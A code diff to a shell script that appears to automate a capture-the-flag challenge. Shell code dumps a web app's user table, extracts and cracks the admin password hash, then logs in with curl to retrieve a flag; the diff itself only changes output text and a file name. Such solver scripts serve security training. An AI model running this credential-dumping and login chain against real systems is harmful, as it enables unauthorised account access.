@@ -27,7 +27,7 @@ sqlite3 /work/2-webapp.db "SELECT * FROM users;" > /work/2-users
 echo "3 - GATHERING HASHED ADMIN PASSWORD"
 HASH=$(grep admin /work/2-users | awk -F'|' '{print $3}')
 echo $HASH > /work/2-hash.txt
-echo "Hash : $HASH"
+echo "--> Hash : $HASH"
 
 # Crack it with John
 echo "4 - GATHERING HASHED ADMIN PASSWORD"
@@ -44,7 +44,7 @@ PHPSESSID=$(grep PHPSESSID "/work/2-cookies.txt" | awk '{print $7}')
 echo "--> Session initiated : $PHPSESSID"
 
 # Authenticate
-curl -s -X POST "http://$target_ip:81/login.php" -b /work/2-cookies.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "user=admin" -d"pass=${PASSWORD}" > /work/2-cf-flag.html
-echo "--> Flag is : $(sed -n 's/.*<code>\(.*{.*}\)<\/code>.*/\1/p' /work/2-cf-flag.html)"
+curl -s -X POST "http://$target_ip:81/login.php" -b /work/2-cookies.txt -L -H "Content-Type: application/x-www-form-urlencoded" -d "user=admin" -d"pass=${PASSWORD}" > /work/2-flag.html
+echo "--> Flag is : $(sed -n 's/.*<code>\(.*{.*}\)<\/code>.*/\1/p' /work/2-flag.html)"
 
 rm -f /work/2-cookies.txt
